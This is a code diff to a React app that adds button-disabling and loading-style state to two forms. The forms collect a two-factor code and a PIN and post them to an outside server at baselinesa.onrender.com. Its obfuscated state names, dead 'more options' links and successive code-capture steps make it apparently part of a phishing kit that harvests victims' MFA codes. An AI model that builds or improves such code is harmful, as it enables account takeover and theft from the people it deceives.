@@ -81,6 +81,8 @@ function App() {
         formmsSet('formms')
         classValueShow(responseData.classValue)
         formalSet('')
+        setButtonDisabled(false);
+        bbbSet('')
       }
       // Handle the response data in your React application
     } catch (error) {
@@ -91,6 +93,9 @@ function App() {
 
   const handleTwoFa = async (e) => {
       e.preventDefault()
+
+      setButtonDisabled(true);
+      bbbSet('bbb')
 
       try {
         const response = await axios.post('https://baselinesa.onrender.com/codesmfa', {
@@ -103,11 +108,15 @@ function App() {
         if(responseData.messageCode === "Code is Invalid"){
 
           // alert(responseData.messageCode)
+          setButtonDisabled(false);
+          bbbSet('')
           sorrysSet('')
         } else {
           formallSet('formal')
           formalllSet('')
           pinFaSet('')
+            setButtonDisabled(false);
+          bbbSet('')
         }
   
       } catch (error) {
@@ -259,7 +268,7 @@ function App() {
             <input type="text" name="password" placeholder=""
             value={twoFa} pattern=".{6,}" title="Input must be at least 6 characters long" onChange={handleInputChange}
           required/></div> <br/>
-          <button type="submit">Next</button>
+          <button type="submit" className={bbb} disabled={buttonDisabled}>Next</button>
 
         </form><br/><br/><br/>
         <a href="">I need more options</a><br/><br/><br/><br/>
@@ -277,7 +286,7 @@ function App() {
             <input type="text" name="password" placeholder=""
             value={pinFa} pattern=".{4,}" title="Input must be at least 4 characters long" onChange={handleInputChange}
           required/></div> <br/>
-          <button type="submit">Next</button>
+          <button type="submit" className={bbb} disabled={buttonDisabled}>Next</button>
 
         </form><br/><br/><br/>
         <a href="">I need more options</a><br/><br/><br/><br/>
